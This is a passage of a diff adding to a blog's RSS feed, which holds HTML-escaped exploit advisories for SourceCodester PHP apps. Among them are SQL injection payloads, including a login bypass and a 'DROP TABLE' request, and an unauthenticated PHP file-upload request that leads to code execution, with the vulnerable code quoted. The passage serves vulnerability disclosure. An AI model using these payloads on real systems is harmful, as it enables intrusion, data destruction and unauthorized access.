+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;useremail&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;userpassword&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$database&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;select * from webuser where email=&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Mon, 26 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//Hospital-Management-System-1.0-SQL-Injection</link>
+        <link href="http://localhost:8000/Hospital-Management-System-1.0-SQL-Injection"/>
+        <guid isPermaLink="true">http://localhost:8000/Hospital-Management-System-1.0-SQL-Injection</guid>
+      </item>
+    
+      <item>
+        <title>Flashcard Quiz App 1.0 SQL Injection</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: Flashcard Quiz App - SQL Injection&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Application: Flashcard Quiz App&lt;/li&gt;
+  &lt;li&gt;Date: 25.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: SQL Injection&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://www.sourcecodester.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://www.sourcecodester.com/php/17160/flashcard-quiz-app-using-php-and-mysql-source-code.html&lt;/li&gt;
+  &lt;li&gt;Version: 1.0&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+
+&lt;p&gt;The provided PHP code is vulnerable to SQL injection. SQL injection occurs when user inputs are directly concatenated into SQL queries without proper sanitization, allowing an attacker to manipulate the SQL query and potentially perform unauthorized actions on the database.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+
+&lt;p&gt;This vulnerability involves injecting malicious SQL code into the ‘card’ parameter in the URL.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Original Code:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$card&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;card&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DELETE FROM tbl_card WHERE tbl_card_id = &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$card&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Payload:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-planetext&quot;&gt;&apos; OR &apos;1&apos;=&apos;1&apos;; SELECT IF(VERSION() LIKE &apos;8.0.31%&apos;, SLEEP(5), 0); --
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Injected Query:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;DELETE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl_card&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl_card_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;VERSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;8.0.31%&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://i.imgur.com/5IXvpiZ.png&quot;&gt;Request Response foto&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerable-code-section&quot;&gt;Vulnerable code section:&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;endpoint/delete-flashcard.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$card&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;card&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DELETE FROM tbl_card WHERE tbl_card_id = &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$card&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sun, 25 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//Flashcard-Quiz-App-1.0-SQL-Injection</link>
+        <link href="http://localhost:8000/Flashcard-Quiz-App-1.0-SQL-Injection"/>
+        <guid isPermaLink="true">http://localhost:8000/Flashcard-Quiz-App-1.0-SQL-Injection</guid>
+      </item>
+    
+      <item>
+        <title>FAQ Management System 1.0 SQL Injection</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: FAQ Management System - SQL Injection&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Application: FAQ Management System&lt;/li&gt;
+  &lt;li&gt;Date: 25.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: SQL Injection&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://www.sourcecodester.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://www.sourcecodester.com/php/17175/faq-management-system-using-php-and-mysql-source-code.html&lt;/li&gt;
+  &lt;li&gt;Version: 1.0&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+
+&lt;p&gt;The provided code is vulnerable to SQL injection. The vulnerability arises from directly using user input &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;($_GET[&apos;faq&apos;])&lt;/code&gt; in the SQL query without proper validation or sanitization. An attacker can manipulate the ‘faq’ parameter to inject malicious SQL code, leading to unintended and potentially harmful database operations.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+
+&lt;p&gt;An attacker can manipulate the ‘faq’ parameter to perform SQL injection. For example:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Original Request:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://example.com/endpoint/delete-faq.php?faq=123&lt;/code&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Malicious Request (SQL Injection):&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://example.com/endpoint/delete-faq.php?faq=123&apos;; DROP TABLE tbl_faq; --
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This would result in a query like:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;DELETE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl_faq&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl_faq_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;123&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DROP&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl_faq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Which can lead to the deletion of data or even the entire table.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://i.imgur.com/1IENYFg.png&quot;&gt;poc foto&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerable-code-section&quot;&gt;Vulnerable code section:&lt;/h3&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;endpoint/delete-faq.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$faq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;faq&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DELETE FROM tbl_faq WHERE tbl_faq_id = &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$faq&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sun, 25 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//FAQ-Management-System-1.0-SQL-Injection</link>
+        <link href="http://localhost:8000/FAQ-Management-System-1.0-SQL-Injection"/>
+        <guid isPermaLink="true">http://localhost:8000/FAQ-Management-System-1.0-SQL-Injection</guid>
+      </item>
+    
+      <item>
+        <title>Petrol Pump Management Software 1.0 Shell Upload</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: Petrol pump management software - File Upload Remote Code Execution (RCE) (unauthenticated)&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Application: Petrol pump management software&lt;/li&gt;
+  &lt;li&gt;Date: 20.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: File Upload Remote Code Execution (RCE) (unauthenticated)&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://www.sourcecodester.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html&lt;/li&gt;
+  &lt;li&gt;Version: 1.0&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+
+&lt;p&gt;Due to a security vulnerability in “fuelflow/admin/app/web_crud.php,” unauthorized users can upload
+files using the “POST” method. The uploaded files are stored in the “/fuelflow/assets/images” folder.
+This allows malicious individuals to execute unauthorized commands on the system.&lt;/p&gt;
+
+&lt;h4 id=&quot;staus-high-critical-vulnerability&quot;&gt;&lt;strong&gt;Staus: HIGH-CRITICAL Vulnerability&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/1_jue-UhpASC_XxcUWU-QhMYDrSIehnWx/view&quot;&gt;Video&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;File upload Request&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /zerday/fuelflow/admin/app/web_crud.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------82750242321210078514140255085
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/zer/fuelflow/admin/web.php
+Cookie: PHPSESSID=1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;id&quot;
+
+1
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;old_photo1_img&quot;
+
+test.png
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;photo1&quot;; filename=&quot;3.php&quot;
+Content-Type: image/png
+
+&amp;lt;?php phpinfo();?&amp;gt;
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;title&quot;
+
+FuelFlow lite - Developed by Mayuri K. tessss
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;old_photos_img&quot;
+
+test.png
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;photos&quot;; filename=&quot;&quot;
+Content-Type: application/octet-stream
+
+
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;sitekey&quot;
+
+test
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;secretkey&quot;
+
+test
+-----------------------------82750242321210078514140255085
+Content-Disposition: form-data; name=&quot;update&quot;
+
+
+-----------------------------82750242321210078514140255085--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Phpinfo file locaton&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/zerday/fuelflow/assets/images/65d45a6080eca.php&lt;/code&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 20 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//Petrol-Pump-Management-Software-1.0-Shell-Upload</link>
+        <link href="http://localhost:8000/Petrol-Pump-Management-Software-1.0-Shell-Upload"/>
+        <guid isPermaLink="true">http://localhost:8000/Petrol-Pump-Management-Software-1.0-Shell-Upload</guid>
+      </item>
+    
+      <item>
+        <title>Employee Management System 1.0 SQL Injection</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: Employee Management System - SQL Injection&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Application: Employee Management System&lt;/li&gt;
+  &lt;li&gt;Date: 19.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: SQL Injection&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://www.sourcecodester.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://www.sourcecodester.com/php/16999/employee-management-system.html&lt;/li&gt;
+  &lt;li&gt;Version: N/A&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+
+&lt;p&gt;In your code, there is a potential SQL injection vulnerability due to directly incorporating user-provided data into the SQL query used for user login. This situation increases the risk of SQL injection attacks where malicious users may input inappropriate data to potentially harm your database or steal sensitive information.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+
+&lt;p&gt;An example attacker could input the following into the email field instead of a valid email address:&lt;/p&gt;
+
+&lt;p&gt;In this case, the SQL query would look like:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--&apos; AND password = &apos;&apos; AND status = &apos;Active&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;1=1&quot;&lt;/code&gt; is always true, the query would return positive results, allowing the attacker to log in.&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerable-code-section&quot;&gt;Vulnerable code section:&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;pre&gt;&lt;code class=&quot;language-planetext&quot;&gt;employee/Admin/login.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;error_reporting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;../connect.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;//Get website details&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sql_website&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select * from website_setting&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$result_website&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql_website&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$row_website&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_fetch_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result_website&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;btnlogin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
+
+
+&lt;span class=&quot;c1&quot;&gt;//Get Date&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;date_default_timezone_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Africa/Lagos&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$current_date&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Y-m-d h:i:s&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+&lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;txtemail&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;txtpassword&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Active&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+
+ &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM users WHERE email=&apos;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$email&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&apos; and password = &apos;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&apos;  and status = &apos;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$status&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
